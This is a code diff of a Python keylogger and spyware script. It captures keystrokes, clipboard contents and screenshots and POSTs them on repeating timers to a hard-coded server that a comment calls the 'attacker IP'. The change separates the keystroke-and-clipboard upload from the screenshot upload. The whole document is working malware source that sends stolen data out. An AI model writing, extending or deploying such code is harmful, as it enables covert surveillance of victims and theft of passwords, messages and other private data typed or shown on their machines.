@@ -29,33 +29,47 @@ previous_clipboard_data = ""  # To track the previous clipboard content
 
 server_ip = "192.168.43.26"  # Change this based on your attacker IP
 server_port = 8080  # Change this based on your specified port
-send_interval = 5  # Interval (in seconds) between sending data to the server (Change if needed)
+keystroke_clipboard_interval = 5  # Interval (in seconds) between sending keystrokes and clipboard data
+screenshot_interval = 10  # Interval (in seconds) between sending screenshots
 
 # Track whether Ctrl, Alt, Shift is pressed
 ctrl_pressed = False
 alt_pressed = False
 shift_pressed = False
 
-def send_data():
+def send_keystrokes_and_clipboard():
+    try:
+        # Create payload with keystrokes and clipboard data in JSON format
+        payload = json.dumps({
+            "keyboardData": keystrokes,
+            "clipboardData": clipboard_data
+        })
+        # Send POST request to the server with the keystrokes and clipboard data
+        r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
+    except Exception as e:
+        print(f"Couldn't complete request for keystrokes and clipboard data: {e}")
+    
+    # Schedule next call to send_keystrokes_and_clipboard function after specified interval
+    threading.Timer(keystroke_clipboard_interval, send_keystrokes_and_clipboard).start()
+
+def send_screenshot():
     try:
         # Capture screenshot
         screenshot = ImageGrab.grab()
         buffered = io.BytesIO()
         screenshot.save(buffered, format="PNG")
         screenshot_base64 = base64.b64encode(buffered.getvalue()).decode()
-        # Create payload with keystrokes, clipboard data, and screenshot in JSON format
+        # Create payload with screenshot in JSON format
         payload = json.dumps({
-            "keyboardData": keystrokes,
-            "clipboardData": clipboard_data,
             "screenshot": screenshot_base64
         })
-        # Send POST request to the server with the keystrokes, clipboard data, and screenshot
+        # Send POST request to the server with the screenshot
         r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
-        # Schedule next call to send_data function after specified interval
-        timer = threading.Timer(send_interval, send_data)
-        timer.start()
     except Exception as e:
-        print(f"Couldn't complete request: {e}")
+        print(f"Couldn't complete request for screenshot: {e}")
+
+    # Schedule next call to send_screenshot function after specified interval
+    threading.Timer(screenshot_interval, send_screenshot).start()
 
 def handle_keystrokes(key):
     global keystrokes, ctrl_pressed, alt_pressed, shift_pressed
@@ -103,17 +117,13 @@ def monitor_clipboard():
         current_clipboard_data = pyperclip.paste()  # Capture current clipboard content
         if current_clipboard_data != previous_clipboard_data and current_clipboard_data.strip() != "":
             previous_clipboard_data = current_clipboard_data
-            # Send the clipboard data to the server
-            payload = json.dumps({"clipboardData": current_clipboard_data})
-            try:
-                r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
-            except Exception as e:
-                print(f"Failed to send clipboard data: {e}")
+            clipboard_data = current_clipboard_data
         time.sleep(1)  # Polling interval (Change if needed)
 
 # Set up and start the keyboard listener
 with keyboard.Listener(on_press=handle_keystrokes, on_release=on_release) as listener:
-    send_data()
+    send_keystrokes_and_clipboard()
+    send_screenshot()
     clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
     clipboard_thread.start()
     listener.join()
